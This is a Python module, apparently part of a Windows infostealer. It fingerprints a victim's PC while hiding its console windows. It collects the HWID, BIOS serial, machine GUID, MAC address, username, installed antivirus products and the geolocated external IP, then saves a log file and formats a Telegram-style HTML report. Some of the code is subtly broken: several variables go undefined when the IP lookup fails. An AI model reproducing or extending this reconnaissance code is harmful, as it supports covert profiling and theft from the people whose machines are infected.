from psutil import virtual_memory,disk_partitions,disk_usage,cpu_count,cpu_freq
from GPUtil import getGPUs
from socket import gethostbyname, gethostname
from platform import uname,processor
from os import getlogin, makedirs, environ
from os.path import exists
from time import asctime
from requests import get
from subprocess import check_output, PIPE, STARTUPINFO, STARTF_USESHOWWINDOW
from wmi import WMI
from winreg import OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx
from json import loads
from uuid import UUID,getnode
from manager.logger import Log
from preferences.config import config

HIDDEN_WINDOW = STARTUPINFO()
HIDDEN_WINDOW.dwFlags |= STARTF_USESHOWWINDOW

def get_machine_guid():
    try:
        registry_key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        value, _ = QueryValueEx(registry_key, "MachineGuid")
        return value.strip()
    except Exception as e:
        Log(f"get_machine_guid ---> {e}")
        return None

def get_bios_serial_number():
    try:
        c = WMI()
        bios = c.Win32_BIOS()[0]
        return bios.SerialNumber.strip()
    except Exception as e:
        Log(f"get_bios_serial_number ---> {e}")
        return None

def get_baseboard_manufacturer():
    try:
        c = WMI()
        baseboard = c.Win32_BaseBoard()[0]
        return baseboard.Manufacturer.strip()
    except Exception as e:
        Log(f"get_baseboard_manufacturer ---> {e}")
        return None

def get_mac_address():
    try:
        mac = UUID(int=getnode()).hex[-12:]
        return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
    except Exception as e:
        Log(f"get_mac_address ---> {e}")
        return None



def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f} {unit}{suffix}"
        bytes /= factor

def SystemInfo():    
    Log("===========System===========")

    user = uname()
    svmem = virtual_memory()

    drives = disk_partitions()
    drives_info = ''
    for drive in drives:
        drives_info += f"""
Drive: {drive.device}
Name of drive: {drive.mountpoint}
Type of file system: {drive.fstype}
"""
        if drive.opts != 'cdrom':
            mount = disk_usage(drive.mountpoint)
            drives_info += f"""Drive space: {get_size(mount.total)}
drive space available: {get_size(mount.free)}
drive space used: {get_size(mount.used)}
"""
    try:
        hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=PIPE, stderr=PIPE, startupinfo=HIDDEN_WINDOW).decode('utf-8').split('\n')[1].strip()
    except:
        Log(f"hwid ---> can't get")
        hwid = "Can't get"  
    
    gpu_info = ""
    list_gpus = []


    try:
        gpus = getGPUs()
        for gpu in gpus:
            gpu_name = gpu.name
            gpu_free_memory = f"{gpu.memoryFree}MB"
            gpu_total_memory = f"{gpu.memoryTotal}MB"
            gpu_used_memory = f"{int(gpu.memoryTotal)-int(gpu.memoryFree)}MB"
            gpu_temperature = f"{gpu.temperature} °C\n"
            gpu_info += f'\nGPU: {gpu_name}\nTotal GPU memory {gpu_total_memory}\nAvailable GPU memory: {gpu_free_memory}\nGPU used memory: {gpu_used_memory}\nGPU temperature: {gpu_temperature}\n'
            list_gpus.append(gpu.name)
    except:
        Log(f"GPU ---> can't get")
        list_gpus.append('No GPU')
        gpu_info += "No GPU"


    Antiviruses = {
        'C:\\Program Files\\Windows Defender': 'Windows Defender',
        'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
        'C:\\Program Files\\AVG\\Antivirus': 'AVG',
        'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
        'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
        'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
        'C:\\Program Files\\DrWeb': 'Dr.Web',
        'C:\\Program Files\\ESET\\ESET Security': 'ESET',
        'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
        'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
        'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32',
        'C:\\Program Files\\Malwarebytes\\Anti-Malware': 'Malwarebytes'
    }


    Antiviruses = [Antiviruses[d] for d in filter(exists, Antiviruses)]


    ip_info = ""
    internal_ip = gethostbyname(gethostname())
    
    try:
        ip_data = loads(get('https://ipinfo.io/json').text)
        external_ip = ip_data['ip']
        if 'city' in ip_data:
            city = f"🏙City: <code>{ip_data['city']}</code>\n"
        if 'region' in ip_data:
            region = f"Region: {ip_data['region']}\n"
        if 'country' in ip_data:
            country = f"🗺Country: <code>{ip_data['country']}</code>\n"
        if 'loc' in ip_data:
            loc = f"📍Coordinates: <code>{ip_data['loc']}</code>\n"
        if 'org' in ip_data:
            org = f"Organization: {ip_data['org']}\n"
        if 'timezone' in ip_data:
            timezone = f"⌚Timezone: <code>{ip_data['timezone']}</code>\n"
        if 'postal' in ip_data:
            postal = f"Postal: {ip_data['postal']}\n"

    except:
        Log(f"IP ---> can't get")
        external_ip = "Can't get"
        ip_data = "Can't get"
    ip_info += f"""
External IP: {external_ip}
Internal IP: {internal_ip}
{loc}{org}{postal}
"""
    ip_info_msg = f"""
🌐External IP: <code>{external_ip}</code>
🌐Internal IP: <code>{internal_ip}</code>
{loc}"""
    info =""

    serial_number = get_bios_serial_number()
    if get_bios_serial_number():
        info += f"\nBIOS Serial Number: {serial_number}"

    machine_guid = get_machine_guid()
    if machine_guid:
        info += f"\nMachine GUID: {machine_guid}"

    manufacturer = get_baseboard_manufacturer()
    if manufacturer:
        info += f"\nBaseBoard Manufacturer: {manufacturer}"
    try:
        cpu = check_output(["wmic", "cpu", "get", "Name"], shell=True, stdin=PIPE, stderr=PIPE, startupinfo=HIDDEN_WINDOW).strip().split('\n')[2]
    except:
        cpu = processor()

    systeminfo = f"""
=====================MAIN=====================
Time: {asctime()}
{timezone}{city}{region}{country}
Username: {getlogin()}
PC Name: {user.node}
Operation System: {user.system}
OS Release: {user.release}
OS Version: {user.version}
Architecture: {user.machine}
HWID: {hwid}
MAC Address: {get_mac_address()} 
{info}


====================Network===================
{ip_info}
=====================CPU======================
CPU: {cpu}
Count of cores of CPU: {cpu_count(logical=True)}
CPU frequency: {cpu_freq()} MHz


=====================GPU======================
{gpu_info}

======================RAM=====================
RAM: {get_size(svmem.total)}
RAM Available: {get_size(svmem.available)}
RAM Used: {get_size(svmem.used)}


====================DRIVES====================
{drives_info}

====================OTHER=====================
Antiviruses: {', '.join(Antiviruses)}
"""
    
    msgdata=f"""
<b>🖥System🖥</b>
⏲Time: <code>{asctime()}</code>
{timezone}{city}{country}👤Username: <code>{getlogin()}</code>
👤PC Name: <code>{user.node}</code>
🖥OS: <code>{user.system} {user.release}</code>
📋HWID: <code>{hwid}</code>
📋MAC Address: <code>{get_mac_address()}</code> 


<b>🖥Hardware🖥</b>
🔧CPU: <code>{cpu}</code>
🔧RAM: <code>{get_size(svmem.total)}</code>
🔧GPU: <code>{', '.join(list_gpus)}</code>
🛡Antiviruses: <code>{', '.join(Antiviruses)}</code>


<b>📡Network📡</b>{ip_info_msg}
"""

    try:
        user = environ['USERPROFILE']
        pathToLogs = f'{config.pathToLogs}\\System'
        makedirs(pathToLogs, exist_ok=True)
        file = open(f'{pathToLogs}\\PC_info.txt', "w+", encoding='utf-8')
        file.write(systeminfo)
        file.close()
    except Exception as e:
        Log(f"SystemInfo ---> {e}")
    return msgdata